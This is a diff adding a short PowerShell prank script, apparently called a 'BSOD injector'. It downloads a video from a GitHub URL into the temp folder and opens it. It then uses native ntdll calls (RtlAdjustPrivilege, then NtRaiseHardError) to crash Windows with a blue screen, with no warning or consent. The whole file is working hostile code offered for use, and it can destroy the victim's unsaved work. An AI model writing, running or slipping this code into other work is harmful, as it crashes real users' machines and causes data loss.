@@ -1,0 +1,32 @@
+
+$url = "https://github.com/Atzabell/BSOD-inyector/raw/refs/heads/main/payaso_inyect.mp4"
+$videoPath = "$env:TEMP\video_bsod.mp4"
+
+
+Invoke-WebRequest -Uri $url -OutFile $videoPath
+
+
+Start-Process "explorer.exe" "`"$videoPath`""
+
+
+Start-Sleep -Seconds 5
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class NativeMethods {
+    [DllImport("ntdll.dll")]
+    public static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool previousValue);
+
+    [DllImport("ntdll.dll")]
+    public static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint responseOption, out uint response);
+}
+"@
+
+[bool]$prev = $false
+[void][NativeMethods]::RtlAdjustPrivilege(19, $true, $false, [ref]$prev)
+[uint32]$err = [BitConverter]::ToUInt32([BitConverter]::GetBytes(0xC0000022), 0)
+[uint32]$resp = 0
+[void][NativeMethods]::NtRaiseHardError($err, 0, 0, [IntPtr]::Zero, 6, [ref]$resp)
+#BOOM
